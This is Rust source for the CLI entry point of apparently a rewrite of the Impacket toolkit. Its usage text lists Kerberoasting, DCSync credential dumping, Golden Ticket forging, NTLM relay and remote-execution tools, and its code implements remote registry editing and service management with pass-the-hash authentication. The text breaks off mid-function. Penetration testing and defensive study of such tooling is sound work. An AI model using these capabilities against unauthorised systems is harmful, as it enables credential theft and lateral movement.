//! `impacket-rs`: Unified multi-call CLI for the Rust redesign of Impacket.
//!
//! Live protocol tools (require a reachable target):
//! - `DumpNTLMInfo` — SMB2/3 NTLMSSP host & domain discovery (TCP/445)
//! - `GetNPUsers`   — Kerberos AS-REP Roasting / pre-auth enumeration (TCP/88)
//! - `rpcdump`      — DCE/RPC Endpoint Mapper dump (TCP/135)
//! - `samrdump`     — MS-SAMR user enumeration over `\PIPE\samr` (ncacn_np)
//! - `lookupsid`    — MS-LSAT SID/RID resolution over `\PIPE\lsarpc` (ncacn_np)
//! - `netview`      — MS-SRVS `NetrShareEnum` share listing over `\PIPE\srvsvc` (ncacn_np)
//!
//! Local diagnostics: `compat-matrix`, `parse-target`, `ntlm-hash`, `krb5-asreq`, `smb-negotiate`,
//! `rpc-interfaces`, `bench-ndr`.

use impacket_auth::{
    compute_ntlm_hashes_with_compat, compute_ntlmv1_response, compute_ntlmv2_response,
};
use impacket_core::{encode_hex, hexdump, version, AdCompatProfile, CoreError, FileTime, TargetSpec};
use impacket_dcerpc::{
    get_arch_live, lookup_known_interface, rpcdump_live, EpmEndpointEntry, RpcBindPdu, RpcUuid,
    TcpRpcTransport, WELL_KNOWN_INTERFACES,
};
use impacket_auth::compute_ntlm_hashes;
use impacket_krb5::ccache::CCache;
use impacket_krb5::{
    change_password_kpasswd_live, extract_pac_from_ticket, extract_session_key_from_as_rep,
    get_np_users_live, get_tgs_live, get_tgt_live, parse_ticket_enc_part, send_as_req_live,
    send_fast_armored_as_req_live, string_to_key_aes256, FastArmorConfig, KdcAsResponse,
    KerberosEType, KpasswdResultCode, Krb5AsReq, Krb5TgsReq, Pac, PacLogonInfo, PkinitCredentials,
    PkinitDhState, CKSUMTYPE_CRC32, CKSUMTYPE_HMAC_MD5, CKSUMTYPE_HMAC_SHA1_96_AES128,
    CKSUMTYPE_HMAC_SHA1_96_AES256, CKSUMTYPE_RSA_MD5, PAC_PRIVSVR_CHECKSUM, PAC_SERVER_CHECKSUM,
};
use impacket_ldap::{
    filter_and, filter_equality, filter_or, filter_present, read_dacl, write_dacl, LdapClient,
    SearchScope,
};
use impacket_msrpc::{
    error_control_str, lsat::LsatClient,
    mgmt::{
        probe_opnums, MgmtClient, MGMT_INTERFACE_UUID, MGMT_VERSION_MAJOR, MGMT_VERSION_MINOR,
    },
    rrp::{
        encode_reg_data, format_reg_data, parse_reg_key_path, reg_type, RrpClient, KEY_READ,
        MAXIMUM_ALLOWED,
    },
    samr::SamrClient,
    samr_user_access,
    scmr::{access as scmr_access, service_state, service_type, start_type},
    srvs::SrvsClient,
    start_type_str, ScmrClient, SmbPipeTransport, TschClient, WkstClient,
};
use impacket_mssql::{MssqlClient, QueryResult};
use impacket_ndr::{
    ndr_struct, NdrDeserialize, NdrReader, NdrSerialize, NdrUnicodeString, NdrWriter, RpcSid,
};
use impacket_smb::{
    build_smb2_negotiate_request, build_smbv1_multiprotocol_negotiate, dump_ntlm_info_live,
    SmbCredential, SmbDialect, SmbServer, SmbServerConfig, SmbShare,
};
use std::env;
use std::time::{Duration, Instant};

ndr_struct! {
    pub struct BenchmarkSamrPacket {
        pub handle: [u8; 20],
        pub access_mask: u32,
        pub domain_name: NdrUnicodeString,
        pub domain_sid: RpcSid,
    }
}

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(5);

// Well-known interface indices in WELL_KNOWN_INTERFACES.
const IFACE_SAMR: usize = 1;
const IFACE_LSAT: usize = 2;
const IFACE_SCMR: usize = 5;
const IFACE_SRVS: usize = 6;
const IFACE_RRP: usize = 7;
const IFACE_TSCH: usize = 8;
const IFACE_WKST: usize = 9;
const IFACE_EVEN6: usize = 15;
const IFACE_DFSNM: usize = 13;

fn print_usage() {
    print!("{}", version::BANNER);
    println!();
    println!("LIVE PROTOCOL TOOLS (target = [[domain/]user[:password]@]<host>):");
    println!("  reg <TARGET> <action> [options]                      Windows Remote Registry CLI (query/add/delete/save over MS-RRP)");
    println!("  services <TARGET> <action> [options]                 Windows Remote Services management (MS-SCMR over \\PIPE\\svcctl)");
    println!("  eventlog <TARGET> [-channel <C>] [-xpath <Q>] [opt]  Windows Event Log query & live stream ([MS-EVEN6] over \\PIPE\\eventlog)");
    println!("  mssqlclient <TARGET> [-windows-auth|-sql-auth] [opt] Microsoft SQL Server client & interactive shell (TCP/1433)");
    println!("  DumpNTLMInfo <TARGET> [-port 445]                    Credential-less SMB2/3 NTLMSSP host & domain dumper");
    println!("  GetNPUsers <DOMAIN/USER@KDC_IP>                      Kerberos AS-REP Roasting & pre-auth scanner (TCP/88)
  GetUserSPNs <TARGET> [-request] [-user <name>]       Active Directory SPN discovery & Kerberoast ticket collector (LDAP + TCP/88)");
    println!("  GetUserPAC <TARGET|TICKET> [-target-user <U>] [opt]  Extract & inspect Kerberos PAC from KDC or ticket file");
    println!("  GetADUsers <TARGET> [-all] [-user <username>]        Active Directory user & mailbox enumerator (LDAP TCP/389)");
    println!("  GetADComputers <TARGET> [-computer <name>]           Active Directory computer accounts enumerator (LDAP TCP/389)");
    println!("  GetLAPSPassword <TARGET> [-computer <name>]          Query Active Directory LAPS / Windows LAPS passwords (LDAP TCP/389)");
    println!("  CheckLDAPStatus <TARGET> [-port <port>]              Audit LDAP RootDSE, supported capabilities & signing enforcement");
    println!("  addcomputer <TARGET> [-computer-name <N>] [options]  Provision a computer account in Active Directory (LDAP TCP/389)");
    println!("  dacledit <TARGET> -target-dn <DN> [options]          Inspect or modify Active Directory DACL permissions (LDAP TCP/389)");
    println!("  owneredit <TARGET> -dn <DN> [-action query|set]      Query or change Active Directory object owner SID (LDAP TCP/389)");
    println!("  dnstool <TARGET> -action <query|add|del> [options]   Active Directory Integrated DNS record management ([MS-DNSP] LDAP)");
    println!("  dfsclient <TARGET> [-enum|-info <P>|-add|-remove]    Active Directory DFS Namespace management ([MS-DFSNM] \\PIPE\\netdfs)");
    println!("  ldapsearch <TARGET> [-base <dn>] [-filter <f>]       Active Directory generic LDAP directory search (TCP/389)");
    println!("  ldapclient <TARGET> [options]                        Interactive Active Directory administrative shell & REPL (TCP/389)");
    println!("  getTGT <DOMAIN/USER[:PASS]@KDC_IP> [-hashes :NT]     Request a TGT via RC4 PA-ENC-TIMESTAMP pre-auth");
    println!("  getST <TARGET> -spn <SPN> [-impersonate <USER>]      Request Service Ticket via TGS-REQ or S4U (S4U2Self/Proxy)");
    println!("  getArch <TARGET> [port]                              Remote OS architecture detection (32-bit vs 64-bit via NDR64 bind)");
    println!("  machine_role <TARGET> [-hashes LM:NT]                Query workstation/server domain-join role & OS version (MS-WKST)");
    println!("  rpcdump <TARGET> [-port 135]                         DCE/RPC Endpoint Mapper service dumper (TCP/135)");
    println!("  rpcmap <TARGET> [-port 135] [-pipe <PIPE>] [options] DCE/RPC interface scanner & opnum prober (TCP/SMB)");
    println!("  oxidquery <TARGET> [-port 135]                       DCOM IObjectExporter interface & binding resolver (TCP/135)");
    println!("  samrdump <TARGET> [-hashes LM:NT] [--compat ...]     MS-SAMR (\\PIPE\\samr) user & domain enumerator");
    println!("  samedit -sam <SAM> -system <SYS> -user <U> -pass <P> Modify local user passwords in offline SAM/SYSTEM hives");
    println!("  changepasswd <TARGET> -new-pass <NEW> [options]      Change or reset password via SAMR or Kerberos (TCP/445 or 464)");
    println!("  Get-GPPPassword <TARGET> [-xmlfile <FILE>] [-share SYSVOL] Extract & decrypt Group Policy Preferences cpassword (SYSVOL or offline XML)");
    println!("  lookupsid <TARGET> [-hashes LM:NT] [-rights] [maxRid] MS-LSAT (\\PIPE\\lsarpc) SID/RID resolver & rights enumerator");
    println!("  netview <TARGET> [-hashes LM:NT] [-users] [-info] [-sessions] [-files] MS-SRVS (\\PIPE\\srvsvc) shares/sessions/files & MS-WKST (\\PIPE\\wkssvc) users");
    println!("  netfiles <TARGET> [-hashes LM:NT]                    MS-SRVS (\\PIPE\\srvsvc) opened files & file locks enumerator");
    println!("  net <action> <TARGET> [options]                      Remote net.exe CLI: user, group, localgroup, share, session (SAMR / SRVS)");
    println!("  wmiquery <TARGET> -query <WQL> [options]             WMI / WQL query client & object schema inspector");
    println!("  wmipersist <TARGET> [-action list|info|remove] [opt] WMI Event Subscription & Persistence Manager ([wmipersist.py])");
    println!("  wspsearch <TARGET> -query <Q> [options]              Windows Search Protocol client & remote catalog query ([MS-WSP])");
    println!("  rdp_check <HOST> [-port 3389]                        Audit RDP connection, TLS support & CredSSP / NLA enforcement");
    println!("  registry-read -hive <FILE> | <TARGET> -key <K> [opt] Read offline registry hives or remote registry keys via MS-RRP");
    println!("  tstool <TARGET> [-action list|info|xml|delete|run]   Windows Terminal Services & Task Scheduler inspection ([MS-TSCH])");
    println!("  ping <HOST> [-port <P>] [-count <N>] [-timeout <MS>] Measure TCP connection reachability & latency statistics");
    println!("  tracer <TARGET> [-port <PORT>] [-max-hops <N>]       TCP traceroute & network hop prober ([tracer.py])");
    println!("  sniffer [-pcap <FILE>] [-filter <PORT>] [-test]      Network packet sniffer & protocol dissector ([sniffer.py])");
    println!("  mqtt_check <HOST> [-port 1883] [-user <U>] [-pass <P>] Audit MQTT broker connection & anonymous access ([MQTT-3.1.1])");
    println!("  klist [TICKET_FILE]                                  Inspect cached Kerberos tickets, encryption types & PACs (.ccache / .kirbi)");
    println!("  attrib <TARGET> <SHARE> <PATH> [+/-R] [+/-H]...      Query & modify remote SMB file attributes (READONLY/HIDDEN/SYSTEM)");
    println!("  filetime <VAL> | <TARGET> <SHARE> <PATH> [-set <T>]  Convert FileTime <-> ISO 8601 or touch remote SMB file timestamps");
    println!("  mssqlinstance <TARGET> [-port 1434]                  Discover MSSQL instances & ports over UDP ([MC-SQLR])");
    println!("  checkMSSQLStatus <TARGET> [-port 1433]               Audit MSSQL TDS version, TLS encryption mode & channel binding");
    println!("  smbclient <TARGET> [-batch <F>|-c <cmds>] [options]  Interactive SMB shell or batch script automation");
    println!("  smbserver <SHARE> <PATH> [options]                   Pure-Rust SMB2/3 file server & NetNTLMv2 hash capture");
    println!("  psexec <TARGET> \"<command>\" [-share ADMIN$]           PSEXEC Service exec; output via SMB file");
    println!("  smbexec <TARGET> \"<command>\" [-hashes LM:NT]         MS-SCMR service exec; output via C$ file");
    println!("  atexec <TARGET> \"<command>\" [-hashes LM:NT]          MS-TSCH scheduled-task exec; output via C$ file");
    println!("  atq <TARGET> [-path <DIR>] [-info <TASK>] [-xml <TASK>] MS-TSCH (\\PIPE\\atsvc) scheduled task enumerator & inspector");
    println!("  wmiexec <TARGET> \"<command>\" [-share ADMIN$]          WMI Win32_Process exec; output via SMB file");
    println!("  dcomexec <TARGET> \"<command>\" [-object <name>]        DCOM automation exec (MMC20/ShellWindows/ShellBrowserWindow)");
    println!("  secretsdump <TARGET> [-hashes LM:NT] [-just-dc] [-just-dc-user <user>] [-security] Dump SAM/LSA via RRP or Active Directory credentials via DRSUAPI DCSync");
    println!("  secretsdump-local <SAM_FILE> <SYSTEM_FILE> [SEC_FILE] Dump local SAM hashes and LSA secrets/cached logons");
    println!("  ntdsdump <SYSTEM_FILE> <NTDS_FILE>                   Offline Active Directory domain NT/LM hashes dumper");
    println!("  esentutl <DATABASE_FILE> [tables|table <NAME>]        Extensible Storage Engine (ESE) offline database inspector");
    println!("  dpapi <masterkey|blob> <FILE> [-key <HEX>]           Windows DPAPI MasterKey & Blob offline decryptor");
    println!("  ticketConverter <INPUT> <OUTPUT> [-b]                Convert between .kirbi (Mimikatz) and .ccache (MIT)");
    println!("  ticketer -domain-sid <SID> -domain <D> [options]     Forge Kerberos Golden and Silver Tickets (.ccache / .kirbi)");
    println!("  describeTicket <TICKET_FILE>                         Inspect Kerberos .ccache or .kirbi ticket structures");
    println!("  rbcd <TARGET> -delegate-to <TARGET_DN> [options]     Configure or inspect Resource-Based Constrained Delegation (RBCD)");
    println!("  findDelegation <TARGET> [-base <DN>] [-graph] [-json] Scan Active Directory for Unconstrained, Constrained, and RBCD");
    println!("  trueTree <TARGET> [-base <DN>]                       Discover Active Directory domain trust relationships & forest hierarchy");
    println!("  raiseChild <CHILD_DC> [options] <OUT_TICKET>         Child domain to forest root elevation via Golden Ticket + ExtraSids");
    println!("  smbpasswd <TARGET> -new-pass <PASS> [options]        Change user password via MS-SAMR over SMB");
    println!("  split <FILE> [-size <BYTES>]                         Split database or memory dump files into chunks");
    println!("  ntlmrelayx -t <TARGET>|-tf <FILE> [-proto http|smb]  NTLM cross-protocol relay engine (HTTP/SMB/LDAP/MSSQL)");
    println!();
    println!("LOCAL DIAGNOSTIC SUBCOMMANDS:");
    println!("  compat-matrix                                        Show Win2000 -> Win2025 AD compatibility profiles");
    println!("  parse-target <TARGET> [-hashes LM:NT]                Parse Impacket [[domain/]user[:pass]@]<host> spec");
    println!("  ntlm-hash <PASSWORD> [--legacy-lm]                   Compute LM/NT hashes, NTLMv1/ESS & NTLMv2 responses");
    println!("  krb5-asreq <REALM> <USER> [legacy|auto|modern]       Build RFC 4120 Kerberos AS-REQ PDU");
    println!("  smb-negotiate [legacy|auto|modern]                   Build SMBv1/SMB2/SMB3.1.1 Negotiate PDUs");
    println!("  rpc-interfaces                                       Inspect MSRPC interface catalog & SAMR Bind PDU");
    println!("  bench-ndr [ITERATIONS]                               Benchmark compile-time NDR marshaling throughput");
}

fn parse_compat_flag(args: &[String]) -> AdCompatProfile {
    for i in 0..args.len() {
        if (args[i] == "--compat" || args[i] == "-compat") && i + 1 < args.len() {
            if let Ok(p) = AdCompatProfile::parse(&args[i + 1]) {
                return p;
            }
        }
    }
    AdCompatProfile::UniversalAuto
}

/// Parses `arg0` as a target spec, applying an optional `-hashes LM:NT` flag.
fn parse_target_with_hashes(args: &[String]) -> Result<TargetSpec, String> {
    if args.is_empty() {
        return Err("missing TARGET ([[domain/]user[:password]@]<host>)".into());
    }
    let mut spec = TargetSpec::parse(&args[0]).map_err(|e| e.to_string())?;
    for i in 1..args.len() {
        if args[i] == "-hashes" && i + 1 < args.len() {
            spec = spec.with_hashes(&args[i + 1]).map_err(|e| e.to_string())?;
        }
    }
    spec = spec.with_compat_profile(parse_compat_flag(args));
    Ok(spec)
}

/// Builds the SMB credential (pass-the-hash or password) from a parsed target spec.
fn credential_from(spec: &TargetSpec) -> Result<SmbCredential, String> {
    if let Some(h) = &spec.hashes {
        Ok(SmbCredential::NtlmHashes(h.clone()))
    } else if let Some(p) = &spec.password {
        Ok(SmbCredential::Password(p.expose_secret().to_string()))
    } else {
        Err("authentication required: provide a password (user:pass@host) or -hashes LM:NT".into())
    }
}

/// Opens an authenticated `ncacn_np` transport to the given pipe + interface.
/// If `pipe` is empty or `"auto"`, resolves the named pipe dynamically via EPM (TCP/135).
fn open_pipe_transport(
    spec: &TargetSpec,
    pipe: &str,
    iface_idx: usize,
) -> Result<SmbPipeTransport, CoreError> {
    let cred = credential_from(spec).map_err(CoreError::ProtocolError)?;
    let iface = &WELL_KNOWN_INTERFACES[iface_idx];
    let host = spec.effective_target_ip();

    let effective_pipe = if pipe.is_empty() || pipe.eq_ignore_ascii_case("auto") {
        let resolved = impacket_dcerpc::resolve_named_pipe(
            host,
            &iface.uuid,
            iface.version_major,
            DEFAULT_TIMEOUT,
        )?;
        resolved
            .trim_start_matches(r"\PIPE\")
            .trim_start_matches(r"\pipe\")
            .trim_start_matches('\\')
            .trim_start_matches('/')
            .to_string()
    } else {
        pipe.trim_start_matches(r"\PIPE\")
            .trim_start_matches(r"\pipe\")
            .trim_start_matches('\\')
            .trim_start_matches('/')
            .to_string()
    };

    SmbPipeTransport::connect(
        host,
        &spec.domain,
        &spec.username,
        &cred,
        &effective_pipe,
        iface.uuid,
        iface.version_major,
        iface.version_minor,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    )
}

/// Enumerates domains over SAMR and returns `(domain_name, domain_sid)` for the first account domain
/// (the first domain whose name is not `Builtin`).
fn samr_account_domain(spec: &TargetSpec) -> Result<(String, RpcSid), CoreError> {
    let transport = open_pipe_transport(spec, "samr", IFACE_SAMR)?;
    let mut client = SamrClient::new(transport);
    let server_name = format!(r"\\{}", spec.effective_target_ip());
    let server_handle = client.connect5(&server_name, 0x0000_0230)?;
    let domains = client.enumerate_domains(&server_handle)?;
    let name = domains
        .into_iter()
        .map(|d| d.name)
        .find(|n| !n.eq_ignore_ascii_case("Builtin"))
        .ok_or_else(|| CoreError::ProtocolError("no account domain returned by SAMR".into()))?;
    let sid = client.lookup_domain(&server_handle, &name)?;
    Ok((name, sid))
}

fn cmd_reg(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: reg <TARGET> <action> [options]");
        println!("Actions:");
        println!("  query  -keyName <KEY> [-valueName <VAL>]");
        println!("  dump   -keyName <KEY>                       Dump registry subtree & all values recursively");
        println!("  export -keyName <KEY> [-file <LOCAL_FILE>]  Export registry subtree to Windows .reg format");
        println!("  add    -keyName <KEY> [-valueName <VAL>] [-type <TYPE>] [-data <DATA>]");
        println!("  delete -keyName <KEY> [-valueName <VAL>]");
        println!("  save   -keyName <KEY> -file <REMOTE_FILE>");
        println!();
        println!("Options:");
        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
        println!("  -keyName, -key     Registry key path (e.g. HKLM\\Software\\Microsoft)");
        println!("  -valueName, -value Registry value name (omit in query to enumerate all)");
        println!("  -type              Value type (REG_SZ, REG_DWORD, REG_BINARY, REG_MULTI_SZ, etc.)");
        println!("  -data              Value data to set");
        println!("  -file              Destination path (remote file for save, local for export)");
        return;
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut action = "query";
    let mut key_name: Option<String> = None;
    let mut value_name: Option<String> = None;
    let mut reg_type_str = "REG_SZ";
    let mut data_str: Option<String> = None;
    let mut file_path: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "query" | "add" | "delete" | "save" | "dump" | "export" => {
                action = match args[i].as_str() {
                    "query" => "query",
                    "add" => "add",
                    "delete" => "delete",
                    "save" => "save",
                    "dump" => "dump",
                    "export" => "export",
                    _ => unreachable!(),
                };
            }
            "-key" | "-keyName" => {
                if i + 1 < args.len() {
                    key_name = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-value" | "-valueName" => {
                if i + 1 < args.len() {
                    value_name = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-type" => {
                if i + 1 < args.len() {
                    reg_type_str = &args[i + 1];
                    i += 1;
                }
            }
            "-data" => {
                if i + 1 < args.len() {
                    data_str = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-file" => {
                if i + 1 < args.len() {
                    file_path = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-hashes" | "-compat" | "--compat" => {
                i += 1;
            }
            _ => {}
        }
        i += 1;
    }

    let key_str = match key_name {
        Some(k) => k,
        None => {
            eprintln!("[-] Missing mandatory registry key path (-keyName <KEY>)");
            std::process::exit(1);
        }
    };

    let result = (|| -> Result<(), CoreError> {
        let (hive, subkey) = parse_reg_key_path(&key_str)?;
        let transport = open_pipe_transport(&spec, "winreg", IFACE_RRP)?;
        let mut client = RrpClient::new(transport);

        let root_handle = client.open_hive(hive, MAXIMUM_ALLOWED)?;

        match action {
            "query" => {
                let target_handle = if subkey.is_empty() {
                    root_handle
                } else {
                    client.open_key(&root_handle, &subkey, KEY_READ | MAXIMUM_ALLOWED)?
                };

                if let Some(vname) = &value_name {
                    let (vtype, vdata) = client.query_value(&target_handle, vname)?;
                    println!("    {}    {}    {}", vname, reg_type::name(vtype), format_reg_data(vtype, &vdata));
                } else {
                    println!("{}\\{}", hive.name(), subkey);
                    let mut v_idx = 0;
                    while let Ok(Some((vname, vtype, vdata))) = client.enum_value(&target_handle, v_idx) {
                        let display_name = if vname.is_empty() { "(Default)".to_string() } else { vname };
                        println!("    {}    {}    {}", display_name, reg_type::name(vtype), format_reg_data(vtype, &vdata));
                        v_idx += 1;
                    }
                    let mut k_idx = 0;
                    while let Ok(Some(kname)) = client.enum_key(&target_handle, k_idx) {
                        if subkey.is_empty() {
                            println!("{}\\{}", hive.name(), kname);
                        } else {
                            println!("{}\\{}\\{}", hive.name(), subkey, kname);
                        }
                        k_idx += 1;
                    }
                }

                if !subkey.is_empty() {
                    let _ = client.close_key(&target_handle);
                }
            }
            "add" => {
                if subkey.is_empty() {
                    return Err(CoreError::ProtocolError("Cannot create or modify root hive directly".into()));
                }
                let key_handle = client.create_key(&root_handle, &subkey, MAXIMUM_ALLOWED)?;
                if let Some(vname) = &value_name {
                    let dstr = data_str.unwrap_or_default();
                    let dw_type = reg_type::parse(reg_type_str).ok_or_else(|| {
                        CoreError::ProtocolError(format!("Unknown registry type '{}'", reg_type_str))
                    })?;
                    let bytes = encode_reg_data(dw_type, &dstr)?;
                    client.set_value(&key_handle, vname, dw_type, &bytes)?;
                    println!("[+] Set value '{}\\{}' ({}) to '{}'", subkey, vname, reg_type::name(dw_type), dstr);
                } else {
                    println!("[+] Created key '{}\\{}'", hive.name(), subkey);
                }
                let _ = client.close_key(&key_handle);
            }
            "delete" => {
                if let Some(vname) = &value_name {
                    let key_handle = client.open_key(&root_handle, &subkey, MAXIMUM_ALLOWED)?;
                    client.delete_value(&key_handle, vname)?;
                    println!("[+] Deleted value '{}\\{}'", subkey, vname);
                    let _ = client.close_key(&key_handle);
                } else {
                    client.delete_key(&root_handle, &subkey)?;
                    println!("[+] Deleted key '{}\\{}'", hive.name(), subkey);
                }
            }
            "save" => {
                let dest = file_path.ok_or_else(|| {
                    CoreError::ProtocolError("Missing remote destination file path (-file <PATH>)".into())
                })?;
                let key_handle = if subkey.is_empty() {
                    root_handle
                } else {
                    client.open_key(&root_handle, &subkey, MAXIMUM_ALLOWED)?
                };
                client.save_key(&key_handle, &dest)?;
                println!("[+] Saved hive '{}\\{}' to remote file '{}'", hive.name(), subkey, dest);
                if !subkey.is_empty() {
                    let _ = client.close_key(&key_handle);
                }
            }
            "dump" => {
                let target_handle = if subkey.is_empty() {
                    root_handle
                } else {
                    client.open_key(&root_handle, &subkey, KEY_READ | MAXIMUM_ALLOWED)?
                };
                println!("[*] Dumping registry tree under '{}\\{}'...", hive.name(), subkey);
                let values = client.enum_all_values(&target_handle)?;
                for (vname, vtype, vdata) in values {
                    let display_name = if vname.is_empty() { "(Default)".to_string() } else { vname };
                    println!("    {}    {}    {}", display_name, reg_type::name(vtype), format_reg_data(vtype, &vdata));
                }
                let subkeys = client.enum_all_subkeys(&target_handle)?;
                for kname in subkeys {
                    let child_path = if subkey.is_empty() { kname } else { format!("{}\\{}", subkey, kname) };
                    println!("\n{}\\{}", hive.name(), child_path);
                    if let Ok(child_handle) = client.open_key(&root_handle, &child_path, KEY_READ | MAXIMUM_ALLOWED) {
                        if let Ok(cvals) = client.enum_all_values(&child_handle) {
                            for (vname, vtype, vdata) in cvals {
                                let display_name = if vname.is_empty() { "(Default)".to_string() } else { vname };
                                println!("    {}    {}    {}", display_name, reg_type::name(vtype), format_reg_data(vtype, &vdata));
                            }
                        }
                        let _ = client.close_key(&child_handle);
                    }
                }
                if !subkey.is_empty() {
                    let _ = client.close_key(&target_handle);
                }
            }
            "export" => {
                let target_handle = if subkey.is_empty() {
                    root_handle
                } else {
                    client.open_key(&root_handle, &subkey, KEY_READ | MAXIMUM_ALLOWED)?
                };
                let mut reg_content = String::from("Windows Registry Editor Version 5.00\n\n");
                let full_key_name = format!("[{}\\{}]", hive.name(), subkey);
                reg_content.push_str(&full_key_name);
                reg_content.push('\n');

                let values = client.enum_all_values(&target_handle)?;
                for (vname, vtype, vdata) in values {
                    let entry = match vtype {
                        1 | 2 => {
                            let text = format_reg_data(vtype, &vdata);
                            if vname.is_empty() {
                                format!("@=\"{}\"\n", text.replace('\\', "\\\\").replace('"', "\\\""))
                            } else {
                                format!("\"{}\"=\"{}\"\n", vname, text.replace('\\', "\\\\").replace('"', "\\\""))
                            }
                        }
                        4 => {
                            let val = if vdata.len() >= 4 { u32::from_le_bytes([vdata[0], vdata[1], vdata[2], vdata[3]]) } else { 0 };
                            if vname.is_empty() {
                                format!("@=dword:{:08x}\n", val)
                            } else {
                                format!("\"{}\"=dword:{:08x}\n", vname, val)
                            }
                        }
                        _ => {
                            let hex = vdata.iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(",");
                            if vname.is_empty() {
                                format!("@=hex({:x}):{}\n", vtype, hex)
                            } else {
                                format!("\"{}\"=hex({:x}):{}\n", vname, vtype, hex)
                            }
                        }
                    };
                    reg_content.push_str(&entry);
                }
                if let Some(ref dest_file) = file_path {
                    if let Err(e) = std::fs::write(dest_file, &reg_content) {
                        eprintln!("[-] Failed writing export file '{}': {}", dest_file, e);
                    } else {
                        println!("[+] Exported registry key to '{}'", dest_file);
                    }
                } else {
                    println!("{}", reg_content);
                }
                if !subkey.is_empty() {
                    let _ = client.close_key(&target_handle);
                }
            }
            _ => unreachable!(),
        }

        let _ = client.close_key(&root_handle);
        Ok(())
    })();

    if let Err(e) = result {
        eprintln!("[-] reg error: {}", e);
        std::process::exit(1);
    }
}

fn cmd_services(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: services <TARGET> <action> [options]");
        println!();
        println!("Target Specification: [[domain/]user[:password]@]<host>");
        println!();
        println!("Actions:");
        println!("  list                                      List services available on target");
        println!("  status -name <NAME>                       Query current service status");
        println!("  config -name <NAME>                       Query service configuration");
        println!("  start  -name <NAME>                       Start a service");
        println!("  stop   -name <NAME>                       Stop a service");
        println!("  delete -name <NAME>                       Delete a service");
        println!("  create -name <NAME> -display <D> -path <P> Create a new service");
        println!("  change -name <NAME> [options]             Modify service configuration");
        println!();
        println!("Options:");
        println!("  -name <NAME>            Target service name");
        println!("  -display <DISPLAY_NAME> Display name for service");
        println!("  -path <BINARY_PATH>     Binary path on target");
        println!("  -start_type <TYPE>      Start type (boot, system, auto, demand, disabled)");
        println!("  -service_type <TYPE>    Service type (kernel, file_system, own_process, share_process)");
        println!("  -start_name <ACCOUNT>   Account to run under (e.g. LocalSystem)");
        println!("  -hashes LM:NT           NTLM pass-the-hash authentication");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let action = args.get(1).map(|s| s.to_ascii_lowercase()).unwrap_or_else(|| "list".to_string());
    let mut name = String::new();
    let mut display = String::new();
    let mut path = String::new();
    let mut start_name = String::new();
    let mut start_type_val = start_type::SERVICE_DEMAND_START;
    let mut service_type_val = service_type::SERVICE_WIN32_OWN_PROCESS;

    let mut i = 2;
    while i < args.len() {
        match args[i].as_str() {
            "-name" if i + 1 < args.len() => {
                name = args[i + 1].clone();
                i += 1;
            }
            "-display" if i + 1 < args.len() => {
                display = args[i + 1].clone();
                i += 1;
            }
            "-path" if i + 1 < args.len() => {
                path = args[i + 1].clone();
                i += 1;
            }
            "-start_name" if i + 1 < args.len() => {
                start_name = args[i + 1].clone();
                i += 1;
            }
            "-start_type" if i + 1 < args.len() => {
                start_type_val = match args[i + 1].to_ascii_lowercase().as_str() {
                    "boot" | "0" => start_type::SERVICE_BOOT_START,
                    "system" | "1" => start_type::SERVICE_SYSTEM_START,
                    "auto" | "2" => start_type::SERVICE_AUTO_START,
                    "demand" | "3" => start_type::SERVICE_DEMAND_START,
                    "disabled" | "4" => start_type::SERVICE_DISABLED,
                    _ => start_type::SERVICE_DEMAND_START,
                };
                i += 1;
            }
            "-service_type" if i + 1 < args.len() => {
                service_type_val = match args[i + 1].to_ascii_lowercase().as_str() {
                    "kernel" | "1" => service_type::SERVICE_KERNEL_DRIVER,
                    "file_system" | "2" => service_type::SERVICE_FILE_SYSTEM_DRIVER,
                    "own_process" | "16" | "0x10" => service_type::SERVICE_WIN32_OWN_PROCESS,
                    "share_process" | "32" | "0x20" => service_type::SERVICE_WIN32_SHARE_PROCESS,
                    _ => service_type::SERVICE_WIN32_OWN_PROCESS,
                };
                i += 1;
            }
            _ => {}
        }
        i += 1;
    }

    let result = (|| -> Result<(), CoreError> {
        let transport = open_pipe_transport(&spec, "svcctl", IFACE_SCMR)?;
        let mut client = ScmrClient::new(transport);
        let scm = client.open_sc_manager(None, scmr_access::SC_MANAGER_ALL_ACCESS)?;

        match action.as_str() {
            "list" => {
                println!("[*] Querying services from target {} ...", spec.effective_target_ip());
                let services = client.enum_services_status(
                    &scm,
                    service_type::SERVICE_TYPE_ALL,
                    service_state::SERVICE_STATE_ALL,
                )?;
                println!("{:<30} {:<60} {:<15}", "Service Name", "Display Name", "State");
                println!("{:-<30} {:-<60} {:-<15}", "", "", "");
                for svc in &services {
                    println!(
                        "{:<30} {:<60} {:<15}",
                        svc.service_name,
                        svc.display_name,
                        svc.status.state_str()
                    );
                }
                println!();
                println!("[+] Total Services: {}", services.len());
            }
            "status" => {
                if name.is_empty() {
                    return Err(CoreError::ProtocolError("status requires -name <service>".into()));
                }
                let svc_h = client.open_service(&scm, &name, scmr_access::SERVICE_QUERY_STATUS)?;
                let st = client.query_service_status(&svc_h)?;
                println!("[+] Service '{}':", name);
                println!("  State:            {} (0x{:08X})", st.state_str(), st.current_state);
                println!("  Types:            {}", st.type_names().join(", "));
                println!("  Win32 Exit Code:  {}", st.win32_exit_code);
                println!("  Service Exit Code:{}", st.service_specific_exit_code);
                println!("  Check Point:      {}", st.check_point);
                println!("  Wait Hint:        {}", st.wait_hint);
                let _ = client.close_handle(&svc_h);
            }
            "config" => {
                if name.is_empty() {
                    return Err(CoreError::ProtocolError("config requires -name <service>".into()));
                }
